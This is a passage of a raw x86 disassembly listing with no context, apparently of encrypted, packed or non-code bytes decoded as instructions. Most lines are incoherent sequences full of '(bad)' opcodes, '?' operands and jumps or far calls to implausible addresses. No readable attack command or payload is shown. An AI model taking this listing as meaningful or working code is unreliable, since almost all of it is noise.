  413393:	sbb    eax,DWORD PTR [edx-0x2e]
  413396:	xchg   ebx,eax
  413397:	pushf  
  413398:	pop    esp
  413399:	cwde   
  41339a:	add    esi,esi
  41339c:	fisubr WORD PTR [ebp+0x27]
  41339f:	inc    ebx
  4133a0:	icebp  
  4133a1:	lods   al,BYTE PTR ds:[esi]
  4133a2:	in     al,0x25
  4133a4:	fwait
  4133a5:	mov    ebx,0x68801b34
  4133aa:	mov    BYTE PTR [edx],dl
  4133ac:	xchg   esi,eax
  4133ad:	fnsave [eax]
  4133af:	push   esi
  4133b0:	pop    edx
  4133b1:	adc    DWORD PTR [edi+0x5d9c1fde],esi
  4133b7:	sbb    eax,0x9566a72b
  4133bc:	mov    esp,DWORD PTR [ecx+0x24eba011]
  4133c2:	xor    DWORD PTR [edi-0x7eb865d1],edx
  4133c8:	mov    edx,0xfb699131
  4133cd:	jne    0x413425
  4133cf:	pop    eax
  4133d0:	(bad)  
  4133d1:	js     0x4133c2
  4133d3:	rcl    ch,1
  4133d5:	lods   al,BYTE PTR ds:[esi]
  4133d6:	sbb    eax,0xc5ebc7a3
  4133db:	mov    esi,0xc2094245
  4133e0:	cmp    bh,ch
  4133e2:	sub    al,0x98
  4133e4:	mov    BYTE PTR [eax+0x14],ah
  4133e7:	xlat   BYTE PTR ds:[ebx]
  4133e8:	jmp    0xfd068203
  4133ed:	rcr    DWORD PTR [esi+edi*8-0x59],1
  4133f1:	cli    
  4133f2:	ret    
  4133f3:	push   ecx
  4133f4:	add    eax,0xebd71dd4
  4133f9:	icebp  
  4133fa:	xchg   esp,eax
  4133fb:	mov    ah,0x5e
  4133fd:	push   ebp
  4133fe:	dec    BYTE PTR [ecx+0x55]
  413401:	dec    edx
  413402:	fwait
  413403:	lahf   
  413404:	mov    ?,eax
  413406:	xlat   BYTE PTR ds:[ebx]
  413407:	xchg   DWORD PTR [eax+0x42],ebx
  41340a:	mov    eax,0x5675f997
  41340f:	mov    al,BYTE PTR [edx]
  413411:	push   ecx
  413412:	pop    ebp
  413413:	cld    
  413414:	cdq    
  413415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413417:	jnp    0x413471
  413419:	dec    ebx
  41341a:	jnp    0x41341d
  41341c:	ins    DWORD PTR es:[edi],dx
  41341d:	mov    es,WORD PTR [ebx-0x44e52e72]
  413423:	in     al,dx
  413424:	shr    BYTE PTR [esi-0x6c06ffb3],cl
  41342a:	mov    al,0xb3
  41342c:	sar    BYTE PTR [edi+0x4e],1
  41342f:	in     eax,dx
  413430:	mov    ds:0x7f8a0f81,eax
  413435:	retf   0x9dbb
  413438:	stos   BYTE PTR es:[edi],al
  413439:	(bad)  
  41343a:	xor    edi,ecx
  41343c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41343d:	sahf   
  41343e:	(bad)  
  41343f:	hlt    
  413440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413441:	jno    0x413421
  413443:	mov    bl,0x17
  413445:	dec    esi
  413446:	mov    BYTE PTR [edi-0x7c0d754f],bl
  41344c:	jns    0x4133ea
  41344e:	mov    eax,ds:0xc276f8fd
  413453:	jns    0x413459
  413455:	ds mov ch,0x4f
  413458:	cs leave 
  41345a:	pop    ss
  41345b:	mov    eax,ds:0x5ac32ba6
  413460:	mov    ch,0x16
  413462:	mov    ebp,DWORD PTR [edx-0x2d97831b]
  413468:	push   0xcefa7596
  41346d:	scas   al,BYTE PTR es:[edi]
  41346e:	mov    dh,0xff
  413470:	in     eax,0x23
  413472:	cmp    ebp,0x5e
  413475:	jns    0x41346e
  413477:	hlt    
  413478:	out    0xd,al
  41347a:	lods   eax,DWORD PTR ds:[esi]
  41347b:	jle    0x4134c2
  41347d:	cmp    BYTE PTR [ebp-0x37],bh
  413480:	div    DWORD PTR [eax+eiz*8-0x10537c0a]
  413487:	cmp    al,dl
  413489:	sub    edx,DWORD PTR ds:0xc0679666
  41348f:	pop    ds
  413490:	es fwait
  413492:	call   0xa557956a
  413497:	iret   
  413498:	mov    cl,BYTE PTR [esi-0x426c70fe]
  41349e:	push   esp
  41349f:	xlat   BYTE PTR ds:[ebx]
  4134a0:	add    al,0x35
  4134a2:	jns    0x41343b
  4134a4:	in     eax,0xac
  4134a6:	sbb    edi,DWORD PTR [edi-0x6368b259]
  4134ac:	pop    ds
  4134ad:	ss pop esi
  4134af:	nop
  4134b0:	fsubr  QWORD PTR [edi-0x7e618879]
  4134b6:	xor    al,0xf6
  4134b8:	adc    al,0x78
  4134ba:	das    
  4134bb:	shr    BYTE PTR [edi],cl
  4134bd:	mov    BYTE PTR [eax],bh
  4134bf:	pop    esp
  4134c0:	cmp    al,0xe5
  4134c2:	int3   
  4134c3:	mov    ?,WORD PTR [ebp+0x5b]
  4134c6:	and    eax,0x65c1bc78
  4134cb:	scas   eax,DWORD PTR es:[edi]
  4134cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134cd:	xchg   ebx,eax
  4134ce:	lods   eax,DWORD PTR ds:[esi]
  4134cf:	push   esi
  4134d0:	call   0xbb8f:0x8dbfa491
  4134d7:	pop    DWORD PTR [eax+0x2a9a927a]
  4134dd:	jne    0x41351c
  4134df:	stos   BYTE PTR es:[edi],al
  4134e0:	pop    ss
  4134e1:	cmp    bl,BYTE PTR [esi-0x4e258b85]
  4134e7:	sub    ebx,DWORD PTR [ebp-0x20f23ee6]
  4134ed:	stc    
  4134ee:	shl    BYTE PTR [ecx+0x7d3b96c3],1
  4134f4:	addr16 mov ebx,0x99d4f2dc
  4134fa:	outs   dx,BYTE PTR cs:[esi]
  4134fc:	in     al,dx
  4134fd:	test   eax,0x51bf5650
  413502:	jge    0x41353c
  413504:	cmp    dl,BYTE PTR [ecx-0x46]
  413507:	or     eax,0x3f0863d3
  41350c:	shl    DWORD PTR cs:[ebx-0x46],1
  413510:	cmp    BYTE PTR [edi-0x6e45db1e],bl
  413516:	jno    0x413567
  413518:	retf   
  413519:	cs rcl esp,0x59
  41351d:	inc    ecx
  41351e:	jnp    0x41354e
  413520:	repnz out 0x19,al
  413523:	int    0x9c
  413525:	mov    ebp,0x2828373b
  41352a:	enter  0xab7f,0x57
  41352e:	add    BYTE PTR [ecx],dh
  413530:	dec    eax
  413531:	out    0x21,eax
  413533:	stos   BYTE PTR es:[edi],al
  413534:	lods   eax,DWORD PTR ds:[esi]
  413535:	arpl   WORD PTR [edi-0x54],sp
  413538:	or     ebx,ebx
  41353a:	stc    
  41353b:	rol    BYTE PTR [edx],cl
  41353d:	and    eax,0xdef4ec31
  413542:	adc    bh,dh
  413544:	jecxz  0x4135bc
  413546:	(bad)  
  413547:	cmp    BYTE PTR [edx],bl
  413549:	jns    0x413554
  41354b:	or     BYTE PTR [ebx-0x50],cl
  41354e:	das    
  41354f:	out    0x84,al
  413551:	push   ds
  413552:	ss sahf 
  413554:	push   0x464f726b
  413559:	mov    ebx,0x3fbbb384
  41355e:	js     0x4135b1
  413560:	mov    al,0x5e
  413562:	add    BYTE PTR [edi],al
  413564:	adc    al,0x1a
  413566:	cs adc esp,ebx
  413569:	mov    BYTE PTR [eax+eiz*1],dh
  41356c:	push   eax
  41356d:	test   al,0x22
  41356f:	aas    
  413570:	iret   
  413571:	jo     0x41357e
  413573:	ret    
  413574:	sbb    dh,BYTE PTR [ebp+0x4e]
  413577:	jp     0x4135b4
  413579:	xor    BYTE PTR [esi],0x1
  41357c:	push   esp
  41357d:	fnstsw WORD PTR [edx+esi*4-0x191e748e]
  413584:	sbb    eax,0x6728d072
  413589:	mov    bh,0x25
  41358b:	push   edi
  41358c:	je     0x413542
  41358e:	and    DWORD PTR [ebx+0x595c189e],esp
  413594:	mov    esi,0x867b333f
  413599:	sbb    ebx,DWORD PTR [edx+0x3b30d5a]
  41359f:	sub    bh,cl
  4135a1:	mov    dl,0x30
  4135a3:	push   ss
  4135a4:	dec    ecx
  4135a5:	loopne 0x413619
  4135a7:	and    BYTE PTR es:0xa6a00d21,bh
  4135ae:	cmp    al,0x89
  4135b0:	sub    DWORD PTR [edx],edx
  4135b2:	(bad)  
  4135b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135b4:	ror    BYTE PTR [ecx-0x733265bd],cl
  4135ba:	jg     0x4135f8
  4135bc:	retf   
  4135bd:	pushf  
  4135be:	mov    ds:0xfc0f30ec,eax
  4135c3:	jp     0x413605
  4135c5:	or     cl,BYTE PTR [esi]
  4135c7:	mov    bh,0xe2
  4135c9:	mov    eax,ds:0xbdc130a2
  4135ce:	inc    ebx
  4135cf:	stc    
  4135d0:	test   DWORD PTR [edx+0x17],ebx
  4135d3:	push   eax
  4135d4:	fstp   DWORD PTR fs:[edi+ebx*4]
  4135d8:	add    eax,0x70801aa3
  4135dd:	aam    0xa7
  4135df:	int3   
  4135e0:	mov    eax,DWORD PTR [esi-0x11f280d]
  4135e6:	(bad)  [edi]
  4135e8:	mov    eax,0xc58b1bc
  4135ed:	cmp    eax,0x96454ae8
  4135f2:	scas   eax,DWORD PTR es:[edi]
  4135f3:	fistp  WORD PTR [esi+0x1b08452f]
  4135f9:	dec    edx
  4135fa:	mov    edi,0xc045471c
  4135ff:	push   ecx
  413600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413601:	call   FWORD PTR [ecx+0x36504fc4]
  413607:	sbb    edx,DWORD PTR [edx]
  413609:	and    al,0x86
  41360b:	fmulp  st(5),st
  41360d:	rcr    BYTE PTR [esi-0x4ad17ee],1
  413613:	popa   
  413614:	ficomp DWORD PTR [ecx+0xc13172e]
  41361a:	jmp    0x28a03683
  41361f:	aam    0x6a
  413621:	into   
  413622:	cmp    al,0x25
  413624:	sbb    DWORD PTR [eax-0x30],edi
  413627:	repnz sbb al,0xf5
  41362a:	and    bh,BYTE PTR [edi]
  41362c:	hlt    
  41362d:	sub    eax,0x2ef0b275
  413632:	in     eax,dx
  413633:	adc    al,0x13
  413635:	jge    0x4135ec
  413637:	cld    
  413638:	push   esp
  413639:	xor    esi,edi
  41363b:	mov    eax,DWORD PTR [ebp-0x48]
  41363e:	mov    ecx,DWORD PTR [ebp-0x44]
  413641:	shrd   eax,ecx,0x2
  413645:	shr    ecx,0x2
  413648:	mov    ecx,DWORD PTR [ebp-0x48]
  41364b:	mov    edx,DWORD PTR [ebp-0x44]
  41364e:	xor    eax,edi
  413650:	jmp    0x413bda
  413655:	jnp    0x413664
  413657:	les    edi,FWORD PTR [ebx+0x4c78b338]
  41365d:	jle    0x413689
  41365f:	nop
  413660:	outs   dx,BYTE PTR ds:[esi]
  413661:	out    dx,al
  413662:	inc    esi
  413663:	or     esi,DWORD PTR [ebp+ebx*8-0x4]
  413667:	or     al,0x16
  413669:	cmp    eax,0x72161604
  41366e:	xchg   ebx,eax
  41366f:	xor    al,0xe4
  413671:	test   DWORD PTR [eax-0x3a],ecx
  413674:	ret    
  413675:	loopne 0x4136d0
  413677:	cmp    BYTE PTR [edi+0x1540b63],0xf4
  41367e:	test   al,0xf0
  413680:	ror    DWORD PTR [ebp-0x70],1
  413683:	xor    BYTE PTR [ebx-0x40],0x9f
  413687:	call   0xd259:0x9164b8f2
  41368e:	shl    BYTE PTR ds:0x561e03a4,0x86
  413695:	jno    0x4136bf
  413697:	xchg   esp,eax
  413698:	sti    
  413699:	xor    BYTE PTR [ebx+0x6b],dh
  41369c:	pop    esi
  41369d:	dec    edi
  41369e:	push   ds
  41369f:	add    eax,0x8d054d5c
  4136a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136a5:	dec    edi
  4136a6:	xlat   BYTE PTR ds:[ebx]
  4136a7:	enter  0x748e,0x19
  4136ab:	pop    esp
  4136ac:	clc    
  4136ad:	fisubr WORD PTR [esi+0x3d51833d]
  4136b3:	stos   BYTE PTR es:[edi],al
  4136b4:	pop    edx
  4136b5:	pusha  
  4136b6:	test   BYTE PTR [esp+esi*8+0x77f96d52],dh
  4136bd:	mov    ecx,0xf3f5b4df
  4136c2:	xchg   ch,al
  4136c4:	push   es
  4136c5:	sbb    eax,0xa1b5434c
  4136ca:	mov    edx,0x173d066f
  4136cf:	inc    esi
  4136d0:	mov    ebx,0xc834c4d1
  4136d5:	mov    DWORD PTR [ebp+0x7],ecx
  4136d8:	aad    0x80
  4136da:	inc    BYTE PTR [edx-0xd]
  4136dd:	cli    
  4136de:	mov    dl,0x1f
  4136e0:	add    DWORD PTR [eax+0x1f000fd5],esp
  4136e6:	inc    esi
  4136e7:	jbe    0x413685
  4136e9:	mov    ebx,0x1f3db03c
  4136ee:	and    eax,0xed76ec18
  4136f3:	shl    BYTE PTR [ebx+0x37d3b2f8],0x4c
  4136fa:	mov    esi,0x4f31fe46
  4136ff:	xchg   ecx,ebx
  413701:	ins    DWORD PTR es:[edi],dx
  413702:	aaa    
  413703:	mov    bl,al
  413705:	fbstp  TBYTE PTR [ebx]
  413707:	(bad)  
  413708:	mov    esp,0xeea9f2ff
  41370d:	xchg   esi,eax
  41370e:	iret   
  41370f:	idiv   DWORD PTR [esi]
  413711:	and    DWORD PTR [ebx+edx*1],0x31949652
  413718:	imul   BYTE PTR [ecx-0x1207fa92]
  41371e:	pusha  
  41371f:	dec    ebp
  413720:	xchg   BYTE PTR [ecx],dh
  413722:	push   ebp
  413723:	test   BYTE PTR [eax-0x3801c52],ah
  413729:	xchg   edx,eax
  41372a:	cli    
  41372b:	jmp    DWORD PTR [ecx-0xc]
  41372f:	test   DWORD PTR [edi-0x67],eax
  413732:	ins    DWORD PTR es:[edi],dx
  413733:	iret   
  413734:	mov    al,ds:0xd169e7bb
  413739:	add    al,bh
  41373b:	pop    eax
  41373c:	pushf  
  41373d:	mov    edx,0x502f8277
  413742:	test   ecx,edi
  413744:	cdq    
  413745:	setbe  BYTE PTR ds:0x9147e151
  41374c:	or     DWORD PTR [esi+esi*8],0xcfb6df20
  413753:	jmp    0x311c5faa
  413758:	mov    dl,BYTE PTR [eax-0x47]
  41375b:	jbe    0x41370f
  41375d:	sbb    eax,0xffffffe0
  413760:	sub    dl,BYTE PTR [ecx]
  413762:	sub    ecx,DWORD PTR [esi+0x1c]
  413765:	ret    
  413766:	cmp    DWORD PTR [ebp+0x68],eax
  413769:	jle    0x41379f
  41376b:	mov    ds:0x4a9bc3ce,al
  413770:	leave  
  413771:	xchg   edx,eax
  413772:	cmp    BYTE PTR [esi],0x68
  413775:	push   es
  413776:	jnp    0x4137ec
  413778:	mov    edi,0xc6081e74
  41377d:	daa    
  41377e:	fwait
  41377f:	in     eax,0xdf
  413781:	stos   DWORD PTR es:[edi],eax
  413782:	jle    0x4137f3
  413784:	mov    bh,0x42
  413786:	ror    dh,1
  413788:	push   ebx
  413789:	cwde   
  41378a:	aam    0xeb
  41378c:	sar    BYTE PTR [esi+0x243d13da],1
  413792:	dec    esp
  413793:	and    BYTE PTR [edx],cl
  413795:	dec    eax
  413796:	(bad)  
  413797:	ret    
  413798:	xchg   ecx,eax
  413799:	push   ebp
  41379a:	loop   0x413785
  41379c:	fsub   QWORD PTR [esi+0x52]
  41379f:	stos   BYTE PTR es:[edi],al
  4137a0:	shr    ebp,cl
  4137a2:	mov    esi,0xe1c08ec5
  4137a7:	ficomp WORD PTR [edx]
  4137a9:	loop   0x41376c
  4137ab:	fs stos DWORD PTR es:[edi],eax
  4137ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ae:	aas    
  4137af:	inc    ebp
  4137b0:	and    eax,DWORD PTR [ecx+0x77]
  4137b3:	push   0xbc660797
  4137b8:	cmp    eax,0xe2eb408b
  4137bd:	div    BYTE PTR [esi-0x62]
  4137c0:	enter  0x1d1e,0x7d
  4137c4:	dec    esi
  4137c5:	out    dx,eax
  4137c6:	xor    BYTE PTR [edi+eiz*8],cl
  4137c9:	jbe    0x413762
  4137cb:	and    al,0x39
  4137cd:	xchg   edi,eax
  4137ce:	shl    DWORD PTR [esi-0x31],1
  4137d1:	push   edx
  4137d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d3:	mov    al,ds:0x2e0352f3
  4137d8:	scas   eax,DWORD PTR es:[edi]
  4137d9:	fwait
  4137da:	and    BYTE PTR [ebx],al
  4137dc:	addr16 dec eax
  4137de:	in     eax,0x69
  4137e0:	stos   BYTE PTR es:[edi],al
  4137e1:	or     DWORD PTR [edi+0x4eefc401],esp
  4137e7:	fstp   TBYTE PTR [edi-0x44101b0f]
  4137ed:	loopne 0x4137d4
  4137ef:	jle    0x413843
  4137f1:	mov    dh,0x6c
  4137f3:	mov    ds:0x47808b23,eax
  4137f8:	jns    0x413864
  4137fa:	int    0xe8
  4137fc:	and    eax,0x8c39bc3a
  413801:	mov    esi,0x83a2104e
  413806:	retf   0x775c
  413809:	push   cs
  41380a:	inc    edx
  41380b:	push   cs
  41380c:	adc    dh,bl
  41380e:	lock dec eax
  413810:	push   ebx
  413811:	cmp    eax,0xd2f19238
  413816:	(bad)  
  413817:	cmp    cl,cl
  413819:	mov    al,ds:0x9c487228
  41381e:	mov    esp,0xeb53e775
  413823:	xchg   ebx,eax
  413824:	into   
  413825:	aas    
  413826:	fdivr  st(1),st
  413828:	add    eax,0xe1fe54e7
  41382d:	and    al,0xfb
  41382f:	cmp    al,0xe0
  413831:	in     al,0xdb
  413833:	mov    ah,BYTE PTR [ecx+edi*1+0x40]
  413837:	outs   dx,DWORD PTR ds:[esi]
  413838:	scas   eax,DWORD PTR es:[edi]
  413839:	sahf   
  41383a:	inc    eax
  41383b:	push   0xdefc53d0
  413840:	or     DWORD PTR [ecx-0x3fbff37f],eax
  413846:	fimul  WORD PTR [esi+ebx*8-0x687ac2c1]
  41384d:	cmp    esp,DWORD PTR [ebx]
  41384f:	pop    ss
  413850:	cmp    bl,0x62
  413853:	hlt    
  413854:	js     0x413822
  413856:	ret    
  413857:	div    esp
  413859:	(bad)  
  41385a:	cmp    ch,BYTE PTR [ebp-0x4237223c]
  413860:	ins    DWORD PTR es:[edi],dx
  413861:	int3   
  413862:	or     BYTE PTR [ebp+0x5fcf1fe5],cl
  413868:	hlt    
  413869:	jns    0x41387f
  41386b:	gs out 0xe3,al
  41386e:	adc    ah,BYTE PTR [edi-0x12]
  413871:	ds xchg edi,eax
  413873:	and    DWORD PTR [esi+esi*4-0x7c],ebx
  413877:	cmc    
  413878:	pop    esi
  413879:	outs   dx,BYTE PTR ds:[esi]
  41387a:	xor    BYTE PTR [edi+0x75],0x65
  41387e:	fcmovu st,st(2)
  413880:	add    eax,0xadfc707f
  413885:	push   cs
  413886:	dec    eax
  413887:	js     0x413908
  413889:	test   al,0x2e
  41388b:	adc    BYTE PTR [edi+eiz*1+0x57],0x8f
  413890:	imul   esi,DWORD PTR [ebp+eiz*2+0x76],0xaafbd5b4
  413898:	push   edx
  413899:	dec    edi
  41389a:	xor    edi,0xd783eda1
  4138a0:	inc    eax
  4138a1:	lods   al,BYTE PTR ds:[esi]
  4138a2:	enter  0xbb97,0x94
  4138a6:	pop    ebp
  4138a7:	adc    eax,0xdeaa65ad
  4138ac:	leave  
  4138ad:	dec    ebp
  4138ae:	jge    0xcac042a5
  4138b4:	cmp    cl,BYTE PTR [edx+0x566d5b7]
  4138ba:	xchg   ebx,eax
  4138bb:	lahf   
  4138bc:	clc    
  4138bd:	xchg   ebx,eax
  4138be:	retf   
  4138bf:	pop    esp
  4138c0:	pop    edi
  4138c1:	call   0x6950:0x64212fe0
  4138c8:	pop    eax
  4138c9:	scas   eax,DWORD PTR es:[edi]
  4138ca:	lock and bh,BYTE PTR [ebp-0x304331c8]
  4138d1:	pop    edi
  4138d2:	jmp    0x853e5c62
  4138d7:	mov    eax,DWORD PTR [eax+0x57]
  4138da:	popa   
  4138db:	fs mov ecx,0xd36cb360
  4138e1:	repz je 0x41392a
  4138e4:	add    DWORD PTR [edx],edx
  4138e6:	clc    
  4138e7:	jecxz  0x4138bb
  4138e9:	ss pop ebp
  4138eb:	and    eax,0x67f82923
  4138f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138f1:	call   0x1e81eb77
  4138f6:	ins    DWORD PTR es:[edi],dx
  4138f7:	vmulss xmm1,xmm5,DWORD PTR [edx]
  4138fb:	call   0x8803b005
  413900:	fisubr WORD PTR [esi-0x2]
  413903:	out    dx,eax
  413904:	push   0x66b5d6d9
  413909:	fmul   st,st(3)
  41390b:	and    esp,esp
  41390d:	dec    ecx
  41390e:	or     BYTE PTR [esi],dl
  413910:	popf   
  413911:	mov    al,0xb5
  413913:	or     al,0x26
  413915:	in     eax,0x5e
  413917:	mov    ds:0x396a5d74,eax
  41391c:	jo     0x41389f
  41391e:	popf   
  41391f:	adc    eax,0xde8944d0
  413924:	inc    edx
  413925:	pop    ebp
  413926:	and    al,0xa8
  413928:	in     al,dx
  413929:	or     DWORD PTR [eax+0x6a],ecx
  41392c:	sbb    esp,edi
  41392e:	ss push ds
  413930:	pop    ecx
  413931:	adc    ebp,DWORD PTR [esi*8+0x34ca2f51]
  413938:	data16 fadd st,st(7)
  41393b:	ss leave 
  41393d:	jbe    0x4139b9
  41393f:	or     al,0x78
  413941:	jbe    0x413959
  413943:	into   
  413944:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  413946:	adc    al,0x91
  413948:	pop    ds
  413949:	clc    
  41394a:	mov    ebp,0x178ca1fb
  41394f:	shl    BYTE PTR [eax+0x4a0f35c9],cl
  413955:	push   ebx
  413956:	push   eax
  413957:	mov    ebp,0xabb0b7f1
  41395c:	js     0x4139c6
  41395e:	mov    DWORD PTR cs:[ecx-0x6],edx
  413962:	pop    esi
  413963:	sbb    edi,esp
  413965:	test   ecx,esp
  413967:	sub    eax,0xaff2b512
  41396c:	popa   
  41396d:	hlt    
  41396e:	ss jno 0x413967
  413971:	arpl   WORD PTR ds:0x5e03a160,di
  413977:	fimul  DWORD PTR [eax]
  413979:	inc    esi
  41397a:	xchg   ebp,eax
  41397b:	fstp   TBYTE PTR ds:0x7cd649d3
  413981:	mov    WORD PTR [edi],?
  413983:	cmp    esp,DWORD PTR [eax]
  413985:	jmp    0x168d:0x21ace76f
  41398c:	jno    0x41392d
  41398e:	jecxz  0x413969
  413990:	sahf   
  413991:	adc    eax,0x895b9d81
  413996:	cmp    eax,0x762d4128
  41399b:	jg     0x4139c6
  41399d:	not    edi
  41399f:	xchg   ah,ah
  4139a1:	(bad)  
  4139a3:	imul   dl
  4139a5:	retf   0x5b14
  4139a8:	inc    edi
  4139a9:	cmp    eax,DWORD PTR [eax+0x6]
  4139ac:	mov    al,ds:0x1f311cef
  4139b1:	lods   eax,DWORD PTR ds:[esi]
  4139b2:	loope  0x413985
  4139b4:	fidiv  WORD PTR [ebp+0x137a7d8b]
  4139ba:	je     0x413985
  4139bc:	cld    
  4139bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139be:	cmp    DWORD PTR [edx-0x41852a73],edi
  4139c4:	int3   
  4139c5:	imul   edx,edi,0xd79d8af9
  4139cb:	(bad)  
  4139cd:	jnp    0x41395d
  4139cf:	pop    ds
  4139d0:	dec    ebp
  4139d1:	mov    cl,0xcb
  4139d3:	mov    dl,0xa7
  4139d5:	iret   
  4139d6:	and    al,0xf4
  4139d8:	inc    ebp
  4139d9:	jl     0x413a1d
  4139db:	dec    ecx
  4139dc:	mov    bl,0xb
  4139de:	loope  0x4139ec
  4139e0:	sti    
  4139e1:	mov    eax,ds:0xebcc081d
  4139e6:	and    BYTE PTR [edx],al
  4139e8:	or     esp,DWORD PTR [esi]
  4139ea:	ss mov edx,0x5618f3e6
  4139f0:	mov    BYTE PTR [eax+0x14],dh
  4139f3:	ja     0x4139a7
  4139f5:	xchg   ebx,eax
  4139f6:	fldenv [edx+0x2b70e150]
  4139fc:	pop    ds
  4139fd:	xchg   BYTE PTR [esi],dl
  4139ff:	addr16 cld 
  413a01:	mov    DWORD PTR [eax],ebp
  413a03:	mov    edi,0x8ac0d05b
  413a08:	add    BYTE PTR cs:[ebx],ch
  413a0b:	jo     0x4139fd
  413a0d:	sbb    al,0x85
  413a0f:	call   0x3da9:0x1a682bee
  413a16:	mov    ebp,db7
  413a19:	pop    es
  413a1a:	rol    BYTE PTR [eax+ecx*2],1
  413a1d:	mov    ecx,0xea123eae
  413a22:	rcl    DWORD PTR [edi],1
  413a24:	cs das 
  413a26:	push   ecx
  413a27:	push   ebp
  413a28:	pop    ss
  413a29:	hlt    
  413a2a:	adc    ebp,DWORD PTR [edi+0x29]
  413a2d:	sub    BYTE PTR [edx],al
  413a2f:	sub    al,0xdf
  413a31:	cmc    
  413a32:	retf   
  413a33:	hlt    
  413a34:	inc    ebx
  413a35:	add    DWORD PTR [eax+eiz*1],eax
  413a38:	jno    0x413aa5
  413a3a:	test   BYTE PTR [edi+0x66a53500],0xee
  413a41:	retf   0x5f97
  413a44:	pop    ecx
  413a45:	mov    edi,DWORD PTR [ebp+0x47]
  413a48:	sbb    DWORD PTR [edi+ecx*8],0xde5884b2
  413a4f:	and    al,0x7
  413a51:	(bad)  
  413a52:	jl     0x413a8a
  413a54:	adc    eax,0x24349fd4
  413a59:	es (bad) 
  413a5b:	icebp  
  413a5c:	out    dx,al
  413a5d:	js     0x413a4c
  413a5f:	aaa    
  413a60:	pop    ss
  413a61:	sub    esi,DWORD PTR [ebx+ecx*4]
  413a64:	fwait
  413a65:	push   cs
  413a66:	loop   0x413a07
  413a68:	add    BYTE PTR [edi],al
  413a6a:	jb     0x413a46
  413a6c:	add    dh,cl
  413a6e:	enter  0x7c24,0xa4
  413a72:	pop    eax
  413a73:	sbb    al,0x12
  413a75:	(bad)  
  413a76:	mov    edi,0x639cc294
  413a7b:	mov    al,ds:0xd1296f7f
  413a80:	adc    al,0x57
  413a82:	mov    al,ds:0xa3406822
  413a87:	mov    cl,0xd8
  413a89:	ja     0x413a1f
  413a8b:	test   BYTE PTR ds:0x9ac80524,al
  413a91:	int    0xbc
  413a93:	inc    edx
  413a94:	jge    0x413acc
  413a96:	and    BYTE PTR [ebx+ebx*8+0x58],ah
  413a9a:	scas   eax,DWORD PTR es:[edi]
  413a9b:	mov    ch,0x9
  413a9d:	or     DWORD PTR [ecx],ebp
  413a9f:	mov    dl,bl
  413aa1:	inc    edi
  413aa2:	mov    dh,0x72
  413aa4:	(bad)  
  413aa6:	repz add bl,BYTE PTR [ebx+0x9]
  413aaa:	mov    dl,0x55
  413aac:	inc    esi
  413aad:	aaa    
  413aae:	cmp    edx,DWORD PTR [ecx]
  413ab0:	xor    BYTE PTR [edx+0x1b],dl
  413ab3:	idiv   DWORD PTR [esp+eiz*8-0x4fa28c45]
  413aba:	inc    BYTE PTR [edx+0x7a4045c8]
  413ac0:	jl     0x413b0f
  413ac2:	int    0xe2
  413ac4:	mov    eax,ds:0x9b930f62
  413ac9:	sar    BYTE PTR [ecx+0x196eefbf],cl
  413acf:	sub    BYTE PTR [eax-0x18],bh
  413ad2:	push   eax
  413ad3:	jo     0x413ae0
  413ad5:	sub    BYTE PTR [ebx],al
  413ad7:	or     DWORD PTR [eax+0x24ab956],ebx
  413add:	and    ah,ah
  413adf:	jle    0x413b06
  413ae1:	inc    edi
  413ae2:	xchg   esp,eax
  413ae3:	push   ds
  413ae4:	rcr    DWORD PTR [ebx+0x202b0c4c],1
  413aea:	shr    BYTE PTR [esi],cl
  413aec:	out    dx,eax
  413aed:	xlat   BYTE PTR ds:[ebx]
  413aee:	fist   DWORD PTR [esi-0x18]
  413af1:	pop    esp
  413af2:	cs push ebp
  413af4:	outs   dx,DWORD PTR ds:[esi]
  413af5:	nop
  413af6:	mov    bl,0xe9
  413af8:	inc    esp
  413af9:	and    esp,ebx
  413afb:	push   edx
  413afc:	mov    eax,ds:0xe5f2d631
  413b01:	pop    edx
  413b02:	push   edx
  413b03:	imul   esp,DWORD PTR ds:[edi-0x2e9319b1],0xffffff8f
  413b0b:	push   ebp
  413b0c:	push   edx
  413b0d:	jbe    0x413abe
  413b0f:	in     al,0x6c
  413b11:	das    
  413b12:	xchg   DWORD PTR [esi],esp
  413b14:	xstore-rng (bad)
  413b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b16:	inc    eax
  413b17:	cmp    DWORD PTR [ebx+0x6de3a87b],0x17
  413b1e:	jg     0x413aa8
  413b20:	add    dh,BYTE PTR [eax-0x85b8423]
  413b26:	hlt    
  413b27:	xor    ah,BYTE PTR [esi-0x42b1b5e4]
  413b2d:	xor    BYTE PTR [edx+0xe],dl
  413b30:	sub    dh,bh
  413b32:	pop    esp
  413b33:	dec    eax
  413b34:	xchg   ebx,eax
  413b35:	mov    ebp,0xe40d273a
  413b3a:	pop    eax
  413b3b:	mov    bh,BYTE PTR [edi-0x4cc55116]
  413b41:	ins    BYTE PTR es:[edi],dx
  413b42:	or     DWORD PTR [esi-0x2b425c22],0x22
  413b49:	popf   
  413b4a:	push   es
  413b4b:	leave  
  413b4c:	icebp  
  413b4d:	push   es
  413b4e:	jne    0x413b8e
  413b50:	or     eax,0xc4266101
  413b55:	cmp    edx,esp
  413b57:	sbb    esp,0x785363f1
  413b5d:	adc    DWORD PTR [ecx+eiz*2],eax
  413b60:	add    al,0xf
  413b62:	out    dx,al
  413b63:	xor    esi,edi
  413b65:	mov    cx,0x76c9
  413b69:	adc    eax,0xa495e25
  413b6e:	stc    
  413b6f:	outs   dx,BYTE PTR ds:[esi]
  413b70:	mov    esi,0x47c18472
  413b75:	cs mov eax,0xb25bbb92
  413b7b:	jns    0x413b9c
  413b7d:	push   edx
  413b7e:	lock les ebx,FWORD PTR [ebx]
  413b81:	pop    ss
  413b82:	pop    ss
  413b83:	inc    ebp
  413b84:	int    0x20
